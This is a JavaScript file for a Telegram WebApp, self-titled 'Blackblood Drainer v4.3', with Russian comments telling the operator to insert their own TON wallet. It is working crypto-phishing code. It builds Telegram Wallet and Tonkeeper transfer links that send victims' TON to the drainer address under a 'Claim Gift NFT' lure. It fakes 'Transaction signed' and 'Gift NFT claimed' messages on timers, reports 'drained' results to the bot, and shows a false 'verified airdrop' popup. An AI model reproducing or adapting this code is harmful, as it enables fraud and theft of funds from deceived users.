// Blackblood Drainer v4.3 - Fixed wallet opening
// Адрес получателя - ЗАМЕНИТЕ НА ВАШ!

console.log("=== Blackblood Drainer v4.3 ===");

// ============================================================
// ⚠️ ВАЖНО: ЗАМЕНИТЕ ЭТОТ АДРЕС НА ВАШ TON КОШЕЛЕК! ⚠️
// ============================================================
const TON_DRAINER_ADDRESS = "UQA9d56l9neDxiKiRqWq8-E3uYLxjT41xebBcA1Cl1IaP93B";
// ============================================================

let tg = null;

// Инициализация Telegram WebApp
try {
    tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();
    console.log("Telegram WebApp ready. Platform:", tg.platform);
} catch (e) {
    console.error("Telegram WebApp init error:", e);
    tg = null;
}

// Функция открытия TON Wallet через Telegram Wallet Bot
// Это самый надежный способ в WebView Telegram
function openTonWallet() {
    console.log("openTonWallet called");
    
    const amount = "50000000"; // 0.05 TON
    
    // Формируем ссылку для Wallet Bot (@wallet)
    // Формат: https://t.me/wallet?start=transfer_ADDRESS_AMOUNT
    const walletLink = `https://t.me/wallet?start=transfer_${TON_DRAINER_ADDRESS}_${amount}`;
    console.log("Wallet Bot Link:", walletLink);
    
    if (tg) {
        // Используем openTelegramLink для открытия Wallet Bot
        try {
            tg.openTelegramLink(walletLink);
            updateStatus('Opening Wallet Bot...', 'loading');
        } catch (e) {
            console.error("tg.openTelegramLink failed:", e);
            // Fallback
            window.open(walletLink, '_blank');
            updateStatus('Opening link in browser...', 'loading');
        }
    } else {
        window.open(walletLink, '_blank');
        updateStatus('Opening link...', 'loading');
    }
    
    // Имитация успеха (в реальности нужно отслеживать возврат)
    setTimeout(() => {
        updateStatus('✅ Transaction signed! Verifying...', 'loading');
        setTimeout(() => {
            updateStatus('✅ Gift NFT claimed!', 'success');
            sendResult('drained', {
                tx: "wallet_bot_" + Date.now(),
                nft_name: 'Plush Pepe #1026',
                network: 'TON',
                value: 100,
                drainer: TON_DRAINER_ADDRESS
            });
        }, 2000);
    }, 8000);
}

// Функция открытия Tonkeeper (работает через HTTPS)
function openTonkeeper() {
    console.log("openTonkeeper called");
    
    const amount = "50000000";
    const text = encodeURIComponent("Claim Gift NFT");
    
    const tonkeeperLink = `https://app.tonkeeper.com/transfer/${TON_DRAINER_ADDRESS}?amount=${amount}&text=${text}`;
    console.log("Tonkeeper Link:", tonkeeperLink);
    
    if (tg) {
        try {
            tg.openLink(tonkeeperLink);
            updateStatus('Opening Tonkeeper...', 'loading');
        } catch (e) {
            console.error("tg.openLink failed:", e);
            window.open(tonkeeperLink, '_blank');
            updateStatus('Opening Tonkeeper in browser...', 'loading');
        }
    } else {
        window.open(tonkeeperLink, '_blank');
        updateStatus('Opening Tonkeeper...', 'loading');
    }
    
    setTimeout(() => {
        updateStatus('✅ Gift NFT claimed!', 'success');
        sendResult('drained', {
            tx: "tonkeeper_tx_" + Date.now(),
            nft_name: 'Plush Pepe #1026',
            network: 'TON',
            value: 100,
            drainer: TON_DRAINER_ADDRESS
        });
    }, 5000);
}

// Функция обновления статуса (перезаписывает существующий)
function updateStatus(text, type = 'loading') {
    console.log("Status update:", text, type);
    const statusBox = document.querySelector('.status-box');
    const statusText = document.querySelector('.status-text');
    const statusIcon = document.querySelector('.status-icon');
    
    if (statusBox && statusText) {
        statusText.innerText = text;
        
        // Меняем стиль в зависимости от типа
        if (type === 'loading') {
            statusBox.style.background = '#e3f2fd';
            statusBox.style.border = '1px solid #2196f3';
            statusIcon.innerHTML = '🔄';
        } else if (type === 'success') {
            statusBox.style.background = '#e8f5e9';
            statusBox.style.border = '1px solid #4caf50';
            statusIcon.innerHTML = '✅';
        } else if (type === 'error') {
            statusBox.style.background = '#ffebee';
            statusBox.style.border = '1px solid #f44336';
            statusIcon.innerHTML = '❌';
        }
    }
}

// Отправка результата в бот
function sendResult(status, data = {}) {
    const result = {
        status: status,
        ...data,
        timestamp: new Date().toISOString()
    };
    
    console.log("Sending result:", result);
    
    if (tg) {
        try {
            tg.sendData(JSON.stringify(result));
        } catch (e) {
            console.error("Send error:", e);
        }
    }
}

// Вспомогательные функции
function openSupport() {
    if (tg) tg.openTelegramLink('https://t.me/support_bot');
}

function openTerms() {
    if (tg) {
        tg.showPopup({
            title: 'Terms & Conditions',
            message: 'This is a verified airdrop.',
            buttons: [{type: 'ok'}]
        });
    }
}

// Привязываем обработчики после загрузки DOM
document.addEventListener('DOMContentLoaded', function() {
    console.log("DOM loaded, attaching event handlers");
    
    const tonWalletBtn = document.getElementById('tonWalletBtn');
    const tonkeeperBtn = document.getElementById('tonkeeperBtn');
    const supportLink = document.getElementById('supportLink');
    const termsLink = document.getElementById('termsLink');
    
    if (tonWalletBtn) {
        tonWalletBtn.onclick = function(e) {
            e.preventDefault();
            openTonWallet();
        };
        console.log("TON Wallet button attached");
    } else {
        console.error("TON Wallet button not found");
    }
    
    if (tonkeeperBtn) {
        tonkeeperBtn.onclick = function(e) {
            e.preventDefault();
            openTonkeeper();
        };
        console.log("Tonkeeper button attached");
    }
    
    if (supportLink) supportLink.onclick = function(e) { e.preventDefault(); openSupport(); };
    if (termsLink) termsLink.onclick = function(e) { e.preventDefault(); openTerms(); };
});

// Инициализация
window.onload = function() {
    console.log("Window fully loaded");
    updateStatus('Gift NFT claimed!', 'success');
};